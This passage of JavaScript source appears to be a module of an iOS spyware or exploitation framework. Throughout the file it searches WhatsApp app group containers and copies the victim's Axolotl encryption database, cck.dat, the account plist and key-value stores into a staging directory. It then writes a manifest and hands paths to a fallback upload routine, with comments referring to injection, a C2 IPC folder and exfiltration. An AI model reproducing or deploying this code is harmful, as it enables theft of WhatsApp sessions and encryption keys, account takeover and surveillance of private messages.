				if (hit.group_id === WA_GROUP_SHARED && hit.rank >= WA_EARLY_STOP_RANK) {
					_log("[SESSION-WA] appgroup early-stop shared n=" + scanned + " rank=" + hit.rank);
					break;
				}
				if (hits.length >= 6 && bestRank >= WA_EARLY_STOP_RANK) {
					_log("[SESSION-WA] appgroup early-stop hits_cap n=" + scanned);
					break;
				}
			}
			_usleep(WA_SCAN_INTERVAL_US);
		}
		try { Native.callSymbol("closedir", dp); } catch (_) {}
		_log("[SESSION-WA] appgroup scan done scanned=" + scanned + " scored=" + scored +
			" hits=" + hits.length + " best_rank=" + bestRank + " ms=" + (Date.now() - t0));
	} catch (e) {
		try { _log("[SESSION-WA] appgroup scan ERR " + String(e).slice(0, 80)); } catch (_) {}
	}
	hits.sort(function (a, b) { return (b.rank || 0) - (a.rank || 0); });
	return hits;
}

function _findAppGroup() {
	const hits = _findAppGroupsAll();
	if (!hits.length) return { path: "", score: 0, err: "not_found", groups: [], discovery: "" };
	const best = hits[0];
	return {
		path: best.path,
		score: best.score || 0,
		group_id: best.group_id || "",
		discovery: best.discovery || "score",
		groups: hits,
		err: ""
	};
}

function _plistCandidates(group) {
	const home = _getenv("HOME");
	const list = [];
	if (group) {
		for (let i = 0; i < WA_PLIST_RELS.length; i++) list.push(group + "/" + WA_PLIST_RELS[i].rel);
	}
	if (home) {
		list.push(home + "/Library/Preferences/group.net.whatsapp.WhatsApp.shared.plist");
		list.push(home + "/" + PLIST_NAME);
	}
	return list;
}

function _cckCandidates(group) {
	const home = _getenv("HOME");
	const list = [];
	if (group) {
		for (let i = 0; i < WA_CCK_RELS.length; i++) list.push(group + "/" + WA_CCK_RELS[i].rel);
	}
	if (home) {
		list.push(home + "/Documents/cck.dat");
		list.push(home + "/Library/cck.dat");
		list.push(home + "/cck.dat");
	}
	return list;
}

function _axolotlCandidates(group) {
	const home = _getenv("HOME");
	const list = [];
	if (group) {
		for (let i = 0; i < WA_AX_RELS.length; i++) list.push(group + "/" + WA_AX_RELS[i].rel);
	}
	if (home) {
		list.push(home + "/Documents/Axolotl.sqlite");
		list.push(home + "/Library/Axolotl.sqlite");
		list.push(home + "/Axolotl.sqlite");
	}
	return list;
}

function _kvDbCandidates(group) {
	const list = [];
	if (!group) return list;
	for (let i = 0; i < WA_KV_RELS.length; i++) list.push(group + "/" + WA_KV_RELS[i].rel);
	return list;
}

function _firstExistingInGroups(groups, candidatesFn) {
	const seen = {};
	for (let gi = 0; gi < groups.length; gi++) {
		const g = groups[gi];
		if (!g || !g.path) continue;
		const paths = candidatesFn(g.path);
		for (let i = 0; i < paths.length; i++) {
			const p = paths[i];
			if (seen[p]) continue;
			if (_canOpen(p)) {
				seen[p] = 1;
				return { src: p, group: g.path, group_id: g.group_id || "" };
			}
		}
	}
	return { src: "", group: "", group_id: "" };
}

function _firstExisting(paths) {
	for (let i = 0; i < paths.length; i++) {
		if (_canOpen(paths[i])) return paths[i];
	}
	return "";
}

function _plistHasUserId(path) {
	if (!path || !_canOpen(path)) return false;
	const raw = _readFileHead(path, 65536);
	if (!raw) return false;
	const keys = ["OwnJabberID", "userId", "UserJID", "lastOwnJID", "FullUserName"];
	for (let i = 0; i < keys.length; i++) {
		if (raw.indexOf(keys[i]) >= 0) return true;
	}
	return false;
}

function _collectAuth() {
	try { Native.callSymbol("mkdir", OUT_DIR, 0x1ff); } catch (_) {}
	const groupHit = _findAppGroup();
	const groups = groupHit.groups || [];
	const group = groupHit.path || "";
	const discovery = groupHit.discovery || (group ? "score" : "");
	_log("[SESSION-WA] appgroup=" + (group || "none") + " score=" + (groupHit.score || 0) +
		" id=" + (groupHit.group_id || "") + " discovery=" + discovery + " tried=" + groups.length);

	const axHit = groups.length
		? _firstExistingInGroups(groups, _axolotlCandidates)
		: { src: _firstExisting(_axolotlCandidates(group)), group: group, group_id: groupHit.group_id || "" };
	const plHit = groups.length
		? _firstExistingInGroups(groups, _plistCandidates)
		: { src: _firstExisting(_plistCandidates(group)), group: group, group_id: groupHit.group_id || "" };
	const ckHit = groups.length
		? _firstExistingInGroups(groups, _cckCandidates)
		: { src: _firstExisting(_cckCandidates(group)), group: group, group_id: groupHit.group_id || "" };

	const axSrc = axHit.src || "";
	const plSrc = plHit.src || "";
	const ckSrc = ckHit.src || "";

	const files = [];
	const add = function (name, src, meta) {
		meta = meta || {};
		const dst = OUT_DIR + "/" + name;
		if (!src) {
			files.push({ name: name, src: "", ok: false, size: 0, err: "not_found", from_group: meta.from_group || "" });
			return;
		}
		const r = _copyOne(src, dst);
		files.push({
			name: name, src: src, ok: r.ok, size: r.size || 0, err: r.err || "",
			from_group: meta.from_group || "", group_id: meta.group_id || ""
		});
		_log("[SESSION-WA] copy " + name + " " + (r.ok ? "OK" : "FAIL") +
			" size=" + (r.size || 0) + (r.err ? " err=" + r.err : "") +
			(meta.from_group ? " grp=" + meta.from_group.slice(-8) : ""));
	};

	add("Axolotl.sqlite", axSrc, { from_group: axHit.group, group_id: axHit.group_id });
	if (axSrc) {
		add("Axolotl.sqlite-wal", axSrc + "-wal", { from_group: axHit.group, group_id: axHit.group_id });
		add("Axolotl.sqlite-shm", axSrc + "-shm", { from_group: axHit.group, group_id: axHit.group_id });
	} else {
		files.push({ name: "Axolotl.sqlite-wal", src: "", ok: false, size: 0, err: "no_axolotl" });
		files.push({ name: "Axolotl.sqlite-shm", src: "", ok: false, size: 0, err: "no_axolotl" });
	}
	add("shared.plist", plSrc, { from_group: plHit.group, group_id: plHit.group_id });
	add("cck.dat", ckSrc, { from_group: ckHit.group, group_id: ckHit.group_id });

	const kvNames = ["BackedUpKeyValue.sqlite", "LocalKeyValue.sqlite"];
	for (let ki = 0; ki < kvNames.length; ki++) {
		const kvName = kvNames[ki];
		let kvSrc = "";
		let kvGroup = group;
		let kvGid = groupHit.group_id || "";
		if (groups.length) {
			const kvHit = _firstExistingInGroups(groups, function (gpath) {
				return [gpath + "/" + kvName, gpath + "/Library/" + kvName];
			});
			kvSrc = kvHit.src;
			kvGroup = kvHit.group;
			kvGid = kvHit.group_id;
		} else {
			kvSrc = _firstExisting(_kvDbCandidates(group).filter(function (p) { return p.indexOf(kvName) >= 0; }));
		}
		add(kvName, kvSrc, { from_group: kvGroup, group_id: kvGid });
	}

	let okCount = 0;
	for (let i = 0; i < files.length; i++) if (files[i].ok) okCount++;

	const userIdHint = plSrc && _plistHasUserId(plSrc) ? "likely_ok" : (plSrc ? "unknown" : "missing");
	let skipReason = "";
	if (!group) skipReason = "appgroup_not_found";
	else if (!plSrc && !axSrc) skipReason = "not_logged_in";
	else if (userIdHint === "missing" && !axSrc) skipReason = "not_logged_in";

	const fields = {
		userId: userIdHint,
		axolotl: axSrc ? "ok" : "missing",
		cck: ckSrc ? "ok" : "missing",
		plist: plSrc ? "ok" : "missing"
	};

	const manifest = {
		id: SESSION_ID,
		target: SESSION_TARGET,
		mode: "A.v2",
		discovery: discovery,
		groups_tried: groups.length,
		group: group,
		group_id: groupHit.group_id || "",
		group_score: groupHit.score || 0,
		out_dir: OUT_DIR,
		ok_count: okCount,
		fields: fields,
		skip_reason: skipReason,
		files: files,
		ts: Date.now()
	};
	_writeFile(OUT_DIR + "/manifest.json", JSON.stringify(manifest) + "\n");
	_writeFile(STATUS_PATH, JSON.stringify(manifest) + "\n");
	return manifest;
}

try {
	// Do NOT bare-call invoker() — Native.init() owns first #nc/setup.
	Native.init();
	try { Native.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff); } catch (_) {}
	// eval_ok ONLY after collect — pe-direct used to mark WA done on early eval_ok and skip collect/exfil.
	_writeEval("eval_start", { via: "direct_inject", pid: Number(Native.callSymbol("getpid")) });
	const pid = Native.callSymbol("getpid");
	_log("[SESSION-WA] start id=" + SESSION_ID + " target=" + SESSION_TARGET + " pid=" + pid + " mode=A.v2");

	const man = _collectAuth();
	_log("[SESSION-WA] collect done ok_count=" + man.ok_count + " group_score=" + man.group_score +
		" skip=" + (man.skip_reason || "") + " group=" + (man.group || "none"));
	_writeEval("eval_ok", {
		via: "direct_inject",
		pid: Number(pid),
		ok_count: man.ok_count,
		group_score: man.group_score,
		skip_reason: man.skip_reason || "",
		out_dir: OUT_DIR,
		collect: true
	});
	_writeFile(STATUS_PATH, JSON.stringify({
		state: "collect_done",
		ok: !!(man.ok_count > 0),
		ok_count: man.ok_count,
		group: man.group || "",
		skip_reason: man.skip_reason || "",
		out_dir: OUT_DIR,
		pid: Number(pid),
		ts: Date.now()
	}) + "\n");

	if (!man.ok_count || !man.group || man.skip_reason) {
		try {
			if (typeof __payloadFallbackReport === "function") {
				var related = [APPGROUP_BASE];
				if (man.group) related.push(man.group);
				var ups = [OUT_DIR + "/manifest.json"];
				for (var fi = 0; fi < (man.files || []).length; fi++) {
					var f = man.files[fi];
					if (f && f.src) related.push(f.src);
					if (f && f.ok) related.push(OUT_DIR + "/" + f.name);
				}
				__payloadFallbackReport({
					module_id: "session_whatsapp",
					stage: "collect_auth",
					error: man.skip_reason || (!man.group ? "appgroup_not_found" : ("ok_count=" + man.ok_count)),
					app_id: BUNDLE_HINT,
					related_paths: related,
					upload_paths: ups,
					meta: {
						group_score: man.group_score || 0,
						ok_count: man.ok_count || 0,
						session_id: SESSION_ID,
						discovery: man.discovery || "",
						skip_reason: man.skip_reason || ""
					}
				});
			}
		} catch (_) {}
	}

	let tick = 0;
	const extra = "\"ok_count\":" + man.ok_count + ",\"group_score\":" + man.group_score;
	if (typeof __PE_SESSION_ONESHOT === "undefined" || __PE_SESSION_ONESHOT) {
		_log("[SESSION-WA] oneshot exit id=" + SESSION_ID + " pid=" + pid);
	} else {
	for (;;) {
		tick++;
		_writeHb(pid, tick, extra);
		if (tick === 1 || (tick % 5) === 0) {
			_log("[SESSION-WA] hb id=" + SESSION_ID + " tick=" + tick + " pid=" + pid);
		}
		if (_stopRequested()) {
			_log("[SESSION-WA] stop id=" + SESSION_ID + " tick=" + tick + " pid=" + pid);
			break;
		}
		Native.callSymbol("sleep", 2);
	}
	}
} catch (e) {
	try { _log("[SESSION-WA] THREW " + String(e).slice(0, 120)); } catch (_) {}
	try { _writeEval("eval_fail", { error: String(e).slice(0, 200) }); } catch (_) {}
	try {
		if (typeof __payloadFallbackReport === "function") {
			__payloadFallbackReport({
				module_id: "session_whatsapp",
				stage: "runtime",
				error: String(e).slice(0, 500),
				app_id: BUNDLE_HINT,
				related_paths: [OUT_DIR, STATUS_PATH],
				upload_paths: [],
				meta: { session_id: SESSION_ID }
			});
		}
	} catch (_) {}
}
